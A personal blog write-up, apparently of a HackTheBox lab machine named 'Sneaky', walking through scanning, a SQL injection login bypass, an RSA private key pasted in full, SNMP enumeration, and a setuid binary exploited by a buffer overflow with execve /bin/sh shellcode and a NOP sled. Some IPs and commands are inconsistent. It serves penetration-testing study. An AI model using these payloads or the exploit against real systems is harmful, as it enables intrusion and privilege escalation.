+++

title = "Sneaky"

+++

The goal of this guide since ill be using other guides to solve it will be to learn as much as possible. There are two open ports, 80 & 161 on udp snmp. The webpage is under development, with a web directory that hides some content. 

```
nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60
	-sT full tcp connection three way handshake
	-Pn treat ports as if they are open
	-T5 super speed
### 80 ###

nmap -sU --top-port 1000 -oA nmap/udp 10.10.10.60
	-sU scan udp ports
	--top-ports to scan
###	161	###
```

**GOBUSTER** 	Nothing special

```
/opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/dirctory-list-2.3-small.txt -t 200 -u http://10.10.10.20
```

**DEV**

​	In the dev directory find login.php. One thing to test for if bruteforcing fails is sql injections. could probably test for it while brute forcing to make sure. sqlmap is a great tool to use to test for sql injection. Memorizing basic sql injection is on my to do list. 

I suppose one could just fuzz sql injectio with wfuzz, taking a list of characters and testing the response. 

kind of wana see all the things that we could fuzz that would yield a valid login. ippsec used <mark>' OR '1'='1</mark> the HTB guide used <mark>' OR 1=1;--</mark> there is a sql param list in seclist. 

<https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/>

<http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>

<https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html>

![dev](C:\Hugo\sites\blog\static\images\sneaky\dev.PNG)

![dev2](C:\Hugo\sites\blog\static\images\sneaky\dev2.PNG)

**USER**	thrasivoulos

move this over to the localhost and chmod 600 the file thrasivoulos.pem

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
-----END RSA PRIVATE KEY-----
```

**SNMP-WALK**

Lol tried to login to ssh with the creds and cert but totally forgot that doesn't matter because the ports clossed. ran a more detailed scan using nmap on snmp 161 it gave a crap load of detail. Also my post about snmpwalk was really helpful figuring out what to do. https://chickenpwny.github.io/linux/snmpwalk/ we got the ipv6 address score!!

![face-palm](C:\Users\charl\OneDrive\Pictures\pwn\face-palm.jpg)

```
snmpwalk -c public -v2c 10.10.10.20 ipAddressTable > iptables
```

![snmp](C:\Hugo\sites\blog\static\images\sneaky\snmp.PNG)

notice the ipv6 address doesn't look like a ipv6 address to many colons. 

```
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:8f:0b:58
```

So, we have to make some changes to the address provided by snmpwalk. There some vim foo you can use to edit  make it easier. using  Q & A try and get the above ipv6 address to look like the bottom. One string of Zero's may be removed and the total amount of segments is 7

```
dead:beef:0000:0000:0250:56ff:fe8f:0b58
dead:beef::0250:56ff:fe8f:0b58
```

<mark> man ssh | grep 6</mark> XD i tried using <mark> -h --help</mark> nothing but man had the info i need. there is a small 6 in help page. <mark>  -6      Forces ssh to use IPv6 addresses only.</mark>

```
ssh -6 thrasivoulos@dead:beef::0250:56ff:fe8f:0b58 -i thrasivoulos.pub
```

**USER.TXT**

​	Yay, we have user. where to from here what to do i have not done much enumeration, found some credentials inside mysql_history. I wasn't really sure where to go with this so went to the guide's We're suppose to figure out via native or lineum.sh that there is a suid binary with elevated privilege's. 

*Using the FIND Cmd to locate suid binaries.* The perm could be changed to other values to search for other file permissions. 

we find /usr/local/bin/chal

```
find / -perm +4000 -type f 2>/dev/null
```

![reverse](C:\Hugo\sites\blog\static\images\sneaky\reverse.PNG)

I used NetCat to transfer the binary over. I really suck at Reverse Engineering, i had a guess that gdb would be the go to tool for this. i hate that tool, nothing ever works lol.

I'm going to be talking out of my ass on this part because quite frankly Reverse Engineering terrifies me. 

```
thrasivoulos@Sneaky:~$ file /usr/local/bin/chal

/usr/local/bin/chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
```

You would think they would keep the same lay out as in ippsec video. maybe he uses the github repo instead of kali repo hmmmm.  Anyway's the output's different now slightly less straight forward i think. <mark>checksec -f chal</mark> this tool maybe deprecated. I tried to the github version same output lame it was way nicer in ippsec video. 

![reverse2](C:\Hugo\sites\blog\static\images\sneaky\reverse2.PNG)

![reverseippsec](C:\Hugo\sites\blog\static\images\sneaky\reverseippsec.PNG)

Running file on the binary reveals it's x32, can't really run it locally. Thats something to remember as well when doing reverse engineering. Running the binary without any arguements produces a segmentation fault. 

​	"Segmentation fault's from google say's fairly common they are cause when a program doens't have read or write an illegal memory location. "

```
thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)
```

load up into gdb r with arguement get the segfault copy that to. then use <mark>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500</mark> to generate characters. then use <mark>pattern_offset.rb -q 

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

![reverse4](C:\Hugo\sites\blog\static\images\sneaky\reverse4.PNG)

Take the string and bring it over gdb we could generate the string other ways but this is a nice go to. this should give us a memory address well send that to <mark>patern_offset.rb</mark> find the buffersize for the memory address. this is pretty cool that these things are the same on different computers. we're pretty lucky this is easy. 

![reverse5](C:\Hugo\sites\blog\static\images\sneaky\reverse5.PNG)

![reverse5](C:\Hugo\sites\blog\static\images\sneaky\reverse5.PNG)

We get our address after the segment fault. 

![reverse6](C:\Hugo\sites\blog\static\images\sneaky\reverse6.PNG)

Bring the memory address over and well use metasploit module to find the offset for the address. 

![reverse7](C:\Hugo\sites\blog\static\images\sneaky\reverse7.PNG)

**FAILED** THIS DIDN'T WORKOUT. start GDB <mark>r $(python -c 'print "A"*400')</mark> this will  create a segmentation fault.

![reverse3](C:\Hugo\sites\blog\static\images\sneaky\reverse3.PNG)

**PYTHON** writing the buffer over flow code.

​	We will start out by writing the buffsize then well add the shell code that will call /bin/bash and elevate our session to root. i love this trick with linux system. xD 

![google](C:\Hugo\sites\blog\static\images\sneaky\google.PNG)

https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html

then the code put's everything together so the payload fit's insdie the right place in the buffer overflow. so when we escape out of our memory location our command will get pushed out. something like that. 

i like to think of it like were filling up a up a cup of coffee the foam our code and we fill it up with coffee to elevate the foam. xD there are bunch of good video to work on basic concepts. i know i need to lol

There was some final editing i had to do to get it to work. because the memory address was off slightly. I'd like to cover that just incase. Running the code we made should produce a segment faul again not what we want. We'll run things slightly different and find a better memory address. 

![Image result for foam coffee](https://img.buzzfeed.com/buzzfeed-static/static/enhanced/webdr03/2013/2/7/18/enhanced-buzz-24738-1360278441-13.jpg?downsize=700%3A%2A&output-quality=auto&output-format=auto&output-quality=auto&output-format=auto&downsize=360:*)

```
/usr/local/bin/chal 
r $(python pinkie.py)
```

![reverse8](C:\Hugo\sites\blog\static\images\sneaky\reverse8.PNG)

next will examine the hex and see were the nops end and try and locate a better location. I had to scroll down a couple columns of hex to find a better address. ippsec explained  that nope should continue down the memory address until it find the correct one so being exactly write isn't necessary hopefully. that's what the arrow is suppose to show. 

```
x/400x $esp 
$esp in linux anything that starts with a dollar sign is typically a variable. 
```

![reverse9](C:\Hugo\sites\blog\static\images\sneaky\reverse9.PNG)

change the address in the eip variable in the below script. DON'T FOR GET TO INVERT THE MEMORY ADDRESS. (I did lol)

```
buf_size=362
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73"
shell_code += "\x68\x68\x2f\x62\x69\x6e\x89"
shell_code += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shell_code += "\xcd\x80\x31\xc0\x40\xcd\x80";
nop_sled = "\x90"*(buf_size-len(shell_code))
# essenicially invert the memory address in hex.
eip = "\xb0\xf7\xff\xbf" #0xbffff550

payload = nop_sled + shell_code + eip

print payload
```

Once, the final changes are made move it back over to the remote host. i had to do it remotely vim was bugging out on the remote host. run a slight different command initially you may use gdb. 

```
/usr/local/bin/chal $(python pinkie.py)
```

![reverse10](C:\Hugo\sites\blog\static\images\sneaky\reverse10.PNG)

